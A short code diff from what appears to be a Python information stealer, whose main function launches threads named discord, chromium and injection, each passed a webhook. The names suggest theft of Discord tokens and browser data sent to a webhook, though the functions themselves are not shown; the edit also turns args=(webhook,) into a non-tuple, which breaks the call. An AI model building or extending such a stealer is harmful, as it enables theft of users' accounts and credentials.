@@ -26,8 +26,8 @@ def main() -> None:
     
     
     threads = []
-    for operation in [discord, chromium, injection,]:
-        thread = Thread(target=operation, args=(webhook,))
+    for operation in [discord, chromium, injection]:
+        thread = Thread(target=operation, args=(webhook))
         thread.start()
         threads.append(thread)
         
